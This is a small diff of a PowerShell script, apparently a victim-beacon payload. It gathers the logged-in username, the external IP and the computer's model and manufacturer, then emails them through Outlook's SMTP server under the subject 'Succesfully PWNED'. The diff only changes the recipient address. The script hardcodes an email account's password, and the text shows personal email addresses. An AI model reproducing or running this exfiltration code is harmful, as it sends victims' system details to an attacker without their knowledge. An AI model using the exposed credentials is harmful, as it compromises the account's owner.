@@ -17,7 +17,7 @@ $smtp = new-object Net.Mail.SmtpClient("smtp-mail.outlook.com", 587)
 $smtp.Credentials = New-Object System.Net.NetworkCredential("aslclrisppilsl@hotmail.com", "@slclrisppilsl@@");
 $smtp.EnableSsl = $true
 $Message.From = "aslclrisppilsl@hotmail.com"
-$Message.To.Add("davimoura2609@gmail.com")
+$Message.To.Add("aslclrisppilsl@hotmail.com")
 $ip = Invoke-RestMethod "myexternalip.com/raw"
 $Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
